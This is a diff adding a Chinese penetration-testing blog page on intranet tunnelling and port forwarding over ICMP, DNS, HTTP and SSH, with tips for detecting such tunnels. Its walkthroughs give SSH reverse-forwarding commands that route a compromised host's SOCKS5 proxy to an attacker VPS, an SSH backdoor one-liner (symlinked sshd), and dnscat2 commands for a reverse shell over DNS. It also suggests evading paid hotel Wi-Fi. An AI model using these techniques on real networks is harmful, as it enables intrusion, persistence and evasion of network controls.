@@ -1,0 +1,623 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>内网代理与转发技巧 | 小C♥天天</title>
+        <meta name="author" content="小C&天天">
+        <meta name="description" content="^v^">
+        <meta name="keywords" content="">
+        <link rel="icon" href="/images/icon.jpg">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        <link rel="stylesheet" href="/css/main.css">
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+        <script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>
+        <link rel="stylesheet" href="/css/style.css">
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:30vmin;height:30vmin;padding:60px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #dd20dd;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">正在加载</p><div><img alt="loading" src="/images/afde9fa65a5742a90b51d6e1211e841e.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">小C♥天天</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;文章</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+        <form class="search">
+            <input type="text" placeholder="需要搜索什么？">
+            <button type="submit"></button>
+        </form>
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;小C♥天天</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">文章</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        
+
+<div id="home-posts-wrap" class=>
+<div class="article">
+    <div>
+        <h1>内网代理与转发技巧 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2023/3/14
+        </span>
+        
+        <span class="category">
+            <a href="/categories/内网">
+                <span class="icon">
+                    <svg class="fa-icon"><use xlink:href="#bookmark-solid"></use></svg>
+                </span>
+                内网
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#tags-solid"></use></svg>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/代理与转发" style="color: #00a596">
+                    代理与转发
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    <div class="content" v-pre>
+        <h1 id="壹-内网代理与转发技巧"><a href="#壹-内网代理与转发技巧" class="headerlink" title="壹 内网代理与转发技巧"></a>壹 内网代理与转发技巧</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>内网穿透：利用各种隧道技术，绕过网络防火墙的封锁，实现访问被封锁的目标网络，需要考虑的点：</p>
+<ul>
+<li>能出网，通过允许的协议或一些旁门</li>
+<li>隐蔽，被发现了那就凉了呀</li>
+<li>稳定，关键时刻不能出问题</li>
+<li>限制少，需要的条件越少越好</li>
+<li>覆盖面广，跟上一条其实有点关联，主要考虑使用场景越多越好<span id="more"></span></li>
+</ul>
+<p>隧道技术：一种通过使用互联网络的基础设施在网络之间传递数据的方式，包括数据封装、传输和解包在内的全过程。使用隧道传递的数据（或负载）可以是不同协议的数据帧或包。</p>
+<ul>
+<li>封装：隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递</li>
+<li>传输：被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道</li>
+<li>解包：一旦到达网络终点，数据将被解包并转发到最终目的地</li>
+</ul>
+<p>按所处的协议层分层：</p>
+<ul>
+<li>网络层隧道：ICMP隧道等</li>
+<li>传输层隧道：TCP隧道、UDP隧道</li>
+<li>应用层隧道：HTTP、DNS、SSH等隧道</li>
+</ul>
+<h2 id="1-2-内网主机所有可能的出网方式"><a href="#1-2-内网主机所有可能的出网方式" class="headerlink" title="1.2 内网主机所有可能的出网方式"></a>1.2 内网主机所有可能的出网方式</h2><h3 id="1-2-1-允许ICMP协议出网"><a href="#1-2-1-允许ICMP协议出网" class="headerlink" title="1.2.1 允许ICMP协议出网"></a>1.2.1 允许ICMP协议出网</h3><p>网络防火墙允许<code>ICMP</code>协议出网，即能<code>ping</code>通外网主机，一般都能出网：</p>
+<ul>
+<li><code>Windows</code>系统默认传输<code>32 bytes</code>的数据，内容是固定的<code>abcdefghijklmnopqrstuvwabcdefghi</code>，<code>ping</code>包的大小是可以改变的，但是内容依旧不变，且请求和相应内容相同</li>
+<li><code>Linux</code>系统默认传输<code>48 bytes</code>的数据，头信息比较复杂，但是末尾内容是固定<code>!”#$%&amp;’()+,-./01234567</code></li>
+</ul>
+<p><code>ICMP</code>隐蔽隧道的原理：替换<code>Data</code>部分，利用客户端程序进行接收并处理服务端发送的畸形的<code>ICMP</code>协议（主要是<code>Request</code>和<code>Reply</code>包）</p>
+<p>检测是否为<code>ICMP</code>隐蔽隧道：</p>
+<ul>
+<li>检测同一来源 <code>ICMP</code> 数据包的数量。一个正常的 <code>ping</code> 每秒最多只会发送两个数据包，而使用 <code>ICMP</code> 隧道的浏览器在同一时间会产生上千个 <code>ICMP</code> 数据包</li>
+<li>寻找那些响应数据包中 <code>payload</code> 跟请求数据包不一致的 <code>ICMP</code> 数据包</li>
+<li>注意那些 <code>ICMP</code> 数据包中 <code>payload</code> 大于 <code>64</code> 比特的数据包。当然 <code>icmptunnel</code> 可以配置限制所有数据包的 <code>payload</code> 为 <code>64</code> 比特，这样会使得更难以被检测到</li>
+<li>检查<code>ICMP</code>数据包的协议标签，例如 <code>icmptunnel</code> 会在所有的 <code>ICMPpayload</code> 前面增加 <code>TUNL</code> 标记以用于识别隧道，这就是特征</li>
+</ul>
+<h3 id="1-2-2-允许特定的TCP或UDP协议端口出网"><a href="#1-2-2-允许特定的TCP或UDP协议端口出网" class="headerlink" title="1.2.2 允许特定的TCP或UDP协议端口出网"></a>1.2.2 允许特定的TCP或UDP协议端口出网</h3><p>网络防火墙允许特定的<code>TCP</code>或者<code>UDP</code>端口出网，比如连接外网的<code>22</code>、<code>53</code>、<code>80</code>、<code>443</code>、<code>3389</code>等常见应用的默认监听端口。在一个不能出网的网络环境里面，将所有的<code>TCP</code>和<code>UPD</code>端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致：</p>
+<ul>
+<li>比如配置的防火墙规则前后矛盾，解析的时候遇到匹配规则就退出执行</li>
+<li>比如网络管理员配置允许<code>web</code>服务器访问另一子网的<code>mysql</code>数据库的<code>3306</code>端口。网络管理员配置时偷懒，可能会直接放行<code>web</code>服务器到任意<code>ip</code>地址的<code>3306</code>端口</li>
+</ul>
+<h3 id="1-2-3-允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）"><a href="#1-2-3-允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）" class="headerlink" title="1.2.3 允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）"></a>1.2.3 允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）</h3><h4 id="1-2-3-1-DNS隧道"><a href="#1-2-3-1-DNS隧道" class="headerlink" title="1.2.3.1 DNS隧道"></a>1.2.3.1 DNS隧道</h4><p>原理：配置某个域名的<code>NS</code>服务器，使得对该域名的所有子域解析请求最终到达该<code>NS</code>服务器上，然后将另一个协议的数据编码为一系列<code>DNS</code>查询，响应时客户端将返回的<code>Response</code>数据进行解码得到另一协议的数据</p>
+<p>特征：</p>
+<ul>
+<li><code>DNS</code>隧道建立后依靠不断发送query信息来判断隧道存活性</li>
+<li>通过<code>DNS</code>隧道传输时，客户端将数据编码后作为主机名向DNS服务器提交，DNS服务端解码后读取数据</li>
+</ul>
+<p>检测：</p>
+<ul>
+<li>每个<code>IP</code>地址的<code>DNS</code>流量异常，<code>DNS</code>报文数量大</li>
+<li><code>DNS</code>消息中<code>TXT</code>或<code>NULL</code>等不常用的记录类型多</li>
+<li><code>DNS</code>消息中域名有部分固定不变</li>
+<li><code>DNS</code>服务器的地理位置异常</li>
+<li>访问非受信的<code>DNS</code>服务器</li>
+<li>基于请求域名长度及请求频率统计分析方法</li>
+<li><code>dnscat</code> 查询中包含了 <code>dnscat</code> 字符串</li>
+</ul>
+<h4 id="1-2-3-2-HTTP隧道"><a href="#1-2-3-2-HTTP隧道" class="headerlink" title="1.2.3.2 HTTP隧道"></a>1.2.3.2 HTTP隧道</h4><p>原理：通过<code>HTTP</code>协议与代理服务器建立连接，协议信令中包含要连接到的远程主机的<code>IP</code>和端口，如果有需要身份验证的话还需要加上授权信息，服务器收到信令后首先进行身份验证，通过后便与远程主机建立连接，连接成功之后会返回给客户端<code>200</code>，表示验证通过。此外<code>HTTP</code>隧道是没有进行加密的，不安全的，一般再嵌套一个<code>SSH</code>安全隧道。</p>
+<pre><code class="bash">CONNECT 124.xxx.xxx.xx:443 HTTP/1.1 //建立http隧道要443端口
+Proxy-Connection: Keep-Alive   //客户端到服务器端的连接持续有效
+Content-Length: 0
+Host: 124.xxx.xxx.xx   //主机地址
+Proxy-Authorization:Basic YTph //身份验证信息
+User-Agent: OpenFetion //可以标识请求者的信息,如什么浏览器类型和版本、操作系统、使用语言等信息
+</code></pre>
+<h2 id="1-3-端口映射和端口转发"><a href="#1-3-端口映射和端口转发" class="headerlink" title="1.3 端口映射和端口转发"></a>1.3 端口映射和端口转发</h2><h3 id="1-3-1-端口映射"><a href="#1-3-1-端口映射" class="headerlink" title="1.3.1 端口映射"></a>1.3.1 端口映射</h3><p>假设一个<code>hacker</code>通过扫描暴露到公网中的主机<code>A</code> ，主机<code>A</code>开放了一些敏感端口，而且是弱口令，导致主机<code>A</code>被<code>hacker</code>完全控制。接着<code>hacker</code>就想往公司内网中渗透，通过在主机<code>A</code>监控流量或者扫描的方式，发现了主机<code>B</code>，但是主机<code>B</code>只能由主机<code>A</code>进行访问，开放了<code>80</code>端口，而且没有公网<code>IP</code>。如果<code>hacker</code>想直接访问主机<code>B</code>的<code>80</code>端口，对上面的Web服务进行继续渗透，这就需要进行端口映射，让<code>hacker</code>可以远程连接到<code>80</code>端口，这就是一个端口映射场景，<font color="red">端口映射是将内网主机<code>B</code>的<code>80</code>端口映射到了具有公网IP的主机A上，本质上是将一个本来无法访问的端口映射到可以访问的<code>IP</code>上了</font>。<br><img src="/images/%E5%86%85%E7%BD%91/aca3654e148615c4c95d418bdcb3ac42.png" alt="aca3654e148615c4c95d418bdcb3ac42.png"></p>
+<h3 id="1-3-2-端口转发"><a href="#1-3-2-端口转发" class="headerlink" title="1.3.2 端口转发"></a>1.3.2 端口转发</h3><p>假设<code>hacker</code>位于主机<code>A</code>，主机<code>A</code>可能是攻击者个人电脑，也可能是<code>hacker</code>控制的主机。<code>hacker</code>通过发送恶意邮件的方式给主机<code>B</code>，主机<code>B</code>的用户点开邮件，运行恶意木马导致主机<code>B</code>被感染，就成了我们俗称的肉鸡。虽然已经有木马运行在主机<code>B</code>中，但是由于主机<code>B</code>不在公网中，<code>hacker</code>无法访问到主机<code>B</code>。主机<code>B</code>运行着<code>ssh</code>服务，开放着<code>22</code>端口，<code>hacker</code>如果想在主机<code>A</code>上直接连接主机<code>B</code>的<code>22</code>端口，执行<code>shell</code>命令，这就需要端口转发。<br><img src="/images/%E5%86%85%E7%BD%91/b5dd48d0d0c9c2ab990518d5989856fb.png" alt="b5dd48d0d0c9c2ab990518d5989856fb.png"><br>这时候需要一台主机<code>C</code>，一个公网的<code>VPS</code>，来打通两个机器的通信：</p>
+<ul>
+<li>木马的服务端运行在主机<code>C</code>，同时监听两个端口<code>port1</code>与<code>port2</code></li>
+<li>木马的客户端运行在主机<code>B</code>，分别主动连接主机<code>B</code>的<code>22</code>端口和主机<code>C</code>的<code>port2</code>，可以看到这里主机<code>B</code>的<code>22</code>端口不像端口映射那样规定死的，而是更灵活的，可以让木马客户端改变的</li>
+<li>hacker只需要主动连接主机<code>C</code>的<code>port1</code>，这样就打通了到主机<code>B</code>的<code>22</code>端口线路</li>
+</ul>
+<p><img src="/images/%E5%86%85%E7%BD%91/b127de23fb7d184da5175c066107d935.png" alt="b127de23fb7d184da5175c066107d935.png"></p>
+<h3 id="1-3-3-区别"><a href="#1-3-3-区别" class="headerlink" title="1.3.3 区别"></a>1.3.3 区别</h3><p>端口映射就相当于一个人只能拉手下一个人的手，不可以随便改变，但是端口转发就是一个人根据需要去拉不同人的手，更灵活。</p>
+<h2 id="1-4-HTTP、Socket4、Socket5代理的区别"><a href="#1-4-HTTP、Socket4、Socket5代理的区别" class="headerlink" title="1.4 HTTP、Socket4、Socket5代理的区别"></a>1.4 HTTP、Socket4、Socket5代理的区别</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>作用</th>
+<th>细节</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>http</td>
+<td>代理客户机的http访问，主要代理访问网页</td>
+<td>作用于应用层，常用于客户访问被墙的网站，简称外网，常见的有vpn翻墙操作</td>
+</tr>
+<tr>
+<td>Socket4</td>
+<td>代理的是数据包的传递，只设计数据的加密、安全等，不设计到各种HTTP等协议区分</td>
+<td>只支持TCP协议传输的数据包，也支持身份验证机制、客户端域名解析等等。</td>
+</tr>
+<tr>
+<td>Socket5</td>
+<td>同上</td>
+<td>支持TCP和UDP协议传输的包，包含Socket4的其他功能</td>
+</tr>
+</tbody></table>
+<p><font color=red size=5>个人理解：<strong>Socket</strong>其实并不是一个协议，而是为了方便使用TCP或者UDP而抽象出来的一层，介于应用层和传输层之间的接口，不过也会说它属于传输层协议，而<strong>HTTP</strong>是应用层协议，在渗透中使用Socket5代理是因为<strong>Socket5代理</strong>可以代理的<strong>服务、端口比较多</strong>，而<strong>HTTP</strong>代理相对<strong>比较少</strong>。并不是内网渗透都使用<code>Socket5</code>代理的，一般根据情况而定。</font></p>
+<p><strong>为什么做Socket5代理时，不能ping通对方呢？</strong><br><strong>ping是ICMP协议</strong>，不属于TCP或者UDP的协议，ICMP是网络层与IPV4、6协议（TCP或者UDP）为同层协议，所以在使用Socket5代理时不可以ping通目标的。</p>
+<h1 id="贰-SSH-隧道"><a href="#贰-SSH-隧道" class="headerlink" title="贰 SSH 隧道"></a>贰 SSH 隧道</h1><h2 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h2><p>在内网中几乎所有的<code>linux</code>服务器和网络设备都支持<code>ssh</code>协议。一般情况下，<code>ssh</code>协议是允许通过防火墙和边界设备的，而且<code>ssh</code>协议的传输过程是加密的，所以很难区分合法的<code>ssh</code>会话和攻击者利用其他网络建立的隧道。攻击者就可以使用<code>ssh</code>端口隧道突破防火墙的限制后，建立一些之前无法建立的<code>TCP</code>连接。</p>
+<pre><code class="bash">-C 压缩传输，提高传输速度。
+-f 将 SSH 传输转入后台执行，不占用当前 shell
+-N 建立静默连接（建立了连接但看不到具体会话）
+-g 允许远程主机连接本地用于转发的端口。
+-L 本地端口转发
+-R 远程端口转发
+-D 动态转发（SOCKS 代理）
+-p 指定自己自定义的 SSH 端口
+-i 指定自己的私钥文件
+</code></pre>
+<p><code>SSH</code>隧道优缺点：</p>
+<ul>
+<li><p>优点：<br>隐蔽性较好，数据加密<br><code>ssh</code>功能<code>Linux</code>系统一般都有，方便快捷</p>
+</li>
+<li><p>缺点：<br>需要被控机的管理员权限，开启<code>ssh</code>的端口转发功能<code>GatewayPorts</code><br>需要被控机系统密码，也可以使用<code>ssh</code>漏洞</p>
+</li>
+</ul>
+<h2 id="2-2-前提"><a href="#2-2-前提" class="headerlink" title="2.2 前提"></a>2.2 前提</h2><p>假设我们得到一个 root 权限的主机，且该主机能够出公网，我们打算建立内网隧道点，打通网络，伪装出口 IP。所以我们打算使用使用 <code>SSH</code> 建立内网隧道点，打通网络，伪装出口 IP。</p>
+<ul>
+<li>拓扑图：<br><img src="/images/%E5%86%85%E7%BD%91/3ea2bf3e1d15ad78b397113bad0b85c6.png" alt="3ea2bf3e1d15ad78b397113bad0b85c6.png"></li>
+</ul>
+<h2 id="2-3-复现"><a href="#2-3-复现" class="headerlink" title="2.3 复现"></a>2.3 复现</h2><p>所有的主机的<code>sshd_config</code>配置文件都要将 <code>GatewayPorts</code> 选项调整为 <code>yes</code> 状态：<br><img src="/images/%E5%86%85%E7%BD%91/98742f6e92908c941080a128dfdf0fef.png" alt="98742f6e92908c941080a128dfdf0fef.png"></p>
+<p>首先在被控机开启 <code>socks5</code> 服务，这里相当于进入被控机的另一个终端：</p>
+<pre><code class="bash">ssh -D 0.0.0.0:[内网SOCKS5服务端口] root@localhost -p 自定义端口(可以不设置)
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/bb6370941f81ac6d39ea2485ed734681.png" alt="bb6370941f81ac6d39ea2485ed734681.png"><br>发现需要该被控机的系统密码，我们可以结合 <code>SSH</code> 后门免密登录（这一步应该是提前执行的，我们这里是为了顺着说）：</p>
+<pre><code class="bash">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=自定义端口（这里的端口就是上面的ssh自定义端口）
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/e4883b5671dbc925fc40f5eee47f2500.png" alt="e4883b5671dbc925fc40f5eee47f2500.png"></p>
+<p>接着将该被控机的 <code>Socks5</code> 服务端口转发到 <code>VPS</code> 上的随便一个自定义端口：</p>
+<pre><code class="bash">ssh -R 0.0.0.0:[远程 VPS 中转端口]:0.0.0.0:[被控机 socks5 服务端口] root@vps的IP
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/2440f03cf47ee67c25f470e0beb95629.png" alt="2440f03cf47ee67c25f470e0beb95629.png"><br>可以看到进入到了<code>VPS</code>的终端，这个时候，<code>VPS</code> 上已经开启了内网的 <code>Socks5</code> 代理，直接挂代理连接即可。<br><img src="/images/%E5%86%85%E7%BD%91/89f716914c753947182ae01350d79de5.png" alt="89f716914c753947182ae01350d79de5.png"><br>或者：<br><img src="/images/%E5%86%85%E7%BD%91/f0c789173521ecfb97195c466a8b2004.png" alt="f0c789173521ecfb97195c466a8b2004.png"><br>我们还可以搭配<code>ssh</code>的参数使用，这里就不过多赘述。</p>
+<ul>
+<li>主要的几个命令（这些命令不是死的需要根据不同场景使用）：<pre><code class="bash"># 本地开启socks5
+ssh -D 0.0.0.0:[内网SOCKS5服务端口] root@localhost -p 自定义端口(可以不设置)
+# 本地端口转发，根据拓扑图注意区别内网机和被控机的IP
+ssh -L 0.0.0.0:[VPS 端口]:内网机机IP:[内网机端口] root@被控机网卡1的IP
+# 远程端口转发
+ssh -R 0.0.0.0:[远程 VPS 中转端口]:0.0.0.0:[被控机 socks5 服务端口] root@vps的IP
+# 0.0.0.0IP表示省略，但为了安全性考虑，请务必使用127.0.0.1做为本地监听端口， 而不要使用默认的0.0.0.0
+</code></pre>
+</li>
+</ul>
+<h2 id="2-4-参考"><a href="#2-4-参考" class="headerlink" title="2.4 参考"></a>2.4 参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/daocaokafei/article/details/117718130">内网学习笔记 | SSH 隧道使用</a></li>
+</ul>
+<h1 id="叁-DNS隧道"><a href="#叁-DNS隧道" class="headerlink" title="叁 DNS隧道"></a>叁 DNS隧道</h1><h2 id="3-1-介绍"><a href="#3-1-介绍" class="headerlink" title="3.1 介绍"></a>3.1 介绍</h2><p>有些时候环境 <code>TCP</code> 无法出外网，但是 <code>DNS</code> 可以直接解析，或者配置内网 <code>DNS</code> 服务器后可以解析，那么就可以通过 <code>DNS</code> 反弹 <code>Shell</code>，建立隧道。这里主要讲述反向 <code>DNS</code> 隧道。</p>
+<p>还有有情况就是当我们在酒店、机场等公共场所，通常有<code>Wifi</code>信号，但是当我们访问一个网站时，可能会弹出个窗口，让你输入用户名、密码，登陆之后才可以继续上网。这时，你没有账号，就无法上网。但是有时你会发现，你获取到得 <code>DNS</code> 地址是有效的，并且可以用以进行 <code>DNS</code> 查询，这时你便可以用<code>DNS</code> 隧道技术来实现免费上网了！</p>
+<p><code>DNS</code> 隧道原理：当终端设备在做<code>DNS</code>查询的时候，如果查的域名在<code>DNS</code>服务器本机的<code>cache</code>中没有，它就会去互联网上查询，最终把结果返回给终端设备。这时候在互联网上有台定制的服务器，我们只要依靠<code>DNS</code>的这层约定，就可以交换数据包了。<font color="red">从<code>DNS</code>协议上看，终端设备是在一次次的查询某个特定域名，并得到解析结果，但实际上，终端设备已经通过特定的<code>DNS</code>服务器实现了外部上网</font>。因为这个过程没有直接连到局域网外的机器，因此网关不会转发你的<code>IP</code>包出去，但实际上局域网上的<code>DNS</code>服务器帮我们做了中转。</p>
+<p><code>DNS</code>隧道工具的作用就是将进入<code>DNS</code>隧道的其他协议流量封装到<code>DNS</code>协议内，并将其在<code>DNS</code>隧道上传输，当这些数据包出<code>DNS</code>隧道时就会进行解封装，还原数据，<code>DNS</code>服务器就会取解析和执行这些数据，从而达到代理转发数据的目的。</p>
+<p><code>DNS</code>隧道可以分为<strong>直连</strong>和<strong>中继</strong>两种：</p>
+<ul>
+<li>直连就是<code>Client</code>直接和指定的目标<code>DNS</code>服务器连接，通过将数据编码封装在<code>DNS</code>协议中进行通信，这种方式<strong>速度快</strong>，但是<strong>隐蔽性比较弱</strong>，很容易被探测到，另外<strong>限制比较高</strong>，很多场景不允许自己指定<code>DNS</code>服务器。</li>
+<li>而通过<code>DNS</code>迭代查询而实现的中继隧道，则更为<strong>隐秘</strong>，但同时因为数据包到达目标<code>DNS</code>服务器前需要经过多个节点，所以<strong>速度上较直连慢很多</strong>。</li>
+</ul>
+<p><code>DNS</code>隧道优缺点：</p>
+<ul>
+<li><p>优点：<br>根据中继模式，隐蔽性较好<br>直连模式速度快，局限性高</p>
+</li>
+<li><p>缺点：<br>需要域名<br>直连模式容易被发现<br>中继模式速度慢</p>
+</li>
+</ul>
+<h2 id="3-2-前提"><a href="#3-2-前提" class="headerlink" title="3.2 前提"></a>3.2 前提</h2><ul>
+<li><p>拓扑图：<br><img src="/images/%E5%86%85%E7%BD%91/fa1dd0f78b61f4d46a78c8b2f3b45e40.png" alt="fa1dd0f78b61f4d46a78c8b2f3b45e40.png"></p>
+</li>
+<li><p>使用工具：<code>dnscat2</code><br><code>dnscat2</code>是一个<code>DNS</code>隧道工具，通过<code>DNS</code>协议创建加密的命令和控制通道，它的一大特色就是服务端会有一个命令行控制台，所有的指令都可以在该控制台内完成，包括：文件上传、下载、反弹<code>Shell</code>等。<br><a href="/tools/%E5%86%85%E7%BD%91/dnscat2.zip">dnscat2.zip</a></p>
+</li>
+</ul>
+<pre><code class="bash"># 在VPS上设置服务端，编译安装，VPS需要ruby环境，一般kali自带
+git clone https://github.com/iagox86/dnscat2.git 
+cd dnscat2/server/
+sudo gem install bundler 
+bundle install
+
+# 在被控机上，即可以解析DNS的机子上安装dnscat2，可以将编译好的dnscat2客户端上传，可能会存在依赖问题，根据实际情况选择
+git clone https://github.com/iagox86/dnscat2.git 
+cd dnscat2/client/ 
+make
+</code></pre>
+<ul>
+<li>确保<code>VPS</code>的<code>53</code>端口开启，即<code>DNS</code>服务开放<br><img src="/images/%E5%86%85%E7%BD%91/d13690ed62c4ef8356c34ac518ff205c.png" alt="d13690ed62c4ef8356c34ac518ff205c.png"></li>
+</ul>
+<h2 id="3-3-复现"><a href="#3-3-复现" class="headerlink" title="3.3 复现"></a>3.3 复现</h2><p><font color="red">在没有域名的情况下可以使用直连的方式，也就是<code>domain</code>不加域名，但在数据包中很明显，所有域名都以dnscat为前缀，除非你破解了源代码，防火墙经常会阻止此模式。</font></p>
+<p>首先<code>VPS</code>作为服务端，运行：</p>
+<pre><code class="bash"># 在没有域名的情况下可以使用直连的方式，也就是下面的复现过程，但在数据包中很明显，所有域名都以dnscat为前缀，除非你破解了源代码，防火墙经常会阻止此模式
+ruby ./dnscat2.rb --dns host=服务端IP,port=dns端口,domain=域名 --secret=自定义密码
+# --dns是设置服务端的IP、端口和域名，可以不加，默认没有域名，host=0.0.0.0,port=53
+# --secret是自定义连接密码，可以不加，会自动生成
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/d1e40f7856284d4343454eb43520c640.png" alt="d1e40f7856284d4343454eb43520c640.png"><br>接着被控机作为客户端，运行：</p>
+<pre><code class="bash"># 客户端连接根据实际情况连接也就是上图标红的地方
+# 中继
+./dnscat 域名 --secret=密码
+# 直连
+./dnscat --dns server=x.x.x.x,port=服务端自定义的dns端口 --secret=密码
+# x.x.x.x 就是自己 VPS 的 IP 地址
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/37e89b290b7ec4d0e0a156f8768eb839.png" alt="37e89b290b7ec4d0e0a156f8768eb839.png"><br>被控机出现以上显示，服务端出现下图显示，说明已经建立<code>session</code>：<br><img src="/images/%E5%86%85%E7%BD%91/d42fd90bd8f1333a8d91737ef9a1147e.png" alt="d42fd90bd8f1333a8d91737ef9a1147e.png"><br>我们可以查看当前 <code>session</code>：</p>
+<pre><code class="bash"># 该命令查看session
+windows
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/c174fa86c077370ceae4cfeee489095a.png" alt="c174fa86c077370ceae4cfeee489095a.png"><br>我们进入<code>id 1</code>会话，运行：</p>
+<pre><code class="bash">windows -i [id]
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/8cdc5fa972ed6f6d40167f5cd3e0b5bd.png" alt="8cdc5fa972ed6f6d40167f5cd3e0b5bd.png"><br>可以看到对应的使用说明，我们开启非交互式 <code>shell</code>，会出现新的<code>id</code>，我们继续进入新的<code>id</code>即可进入被控机的<code>shell</code>：<br><img src="/images/%E5%86%85%E7%BD%91/5219fdcef6c1ca8d939d1d4c311e4629.png" alt="5219fdcef6c1ca8d939d1d4c311e4629.png"></p>
+<p>我们还可以使用 <code>listen</code> 命令将内网端口转发出来，即在<code>VPS</code>上运行：</p>
+<pre><code class="bash">listen [VPS的IP]:[本地端口] [内网机的IP]:[内网机端口]
+</code></pre>
+<p><img src="/images/%E5%86%85%E7%BD%91/bafb588167a4b522388580e24f98d452.png" alt="bafb588167a4b522388580e24f98d452.png"><br>接着在<code>VPS</code>开一个新的终端，输入<code>ssh</code>连接，即可访问：<br><img src="/images/%E5%86%85%E7%BD%91/e9a6e0a74f3401b6bc6de24551121e91.png" alt="e9a6e0a74f3401b6bc6de24551121e91.png"></p>
+<p><code>help</code>可查看控制台支持的命令，常用的有：</p>
+<pre><code class="bash">quit （退出控制台）
+kill &lt;id&gt; （中断通道）
+set（设值，比如设置set secret=&lt;new value&gt;来动态改变--secret密码）
+windows（列举出所有的通道）
+window -i &lt;id&gt;（连接某个通道）
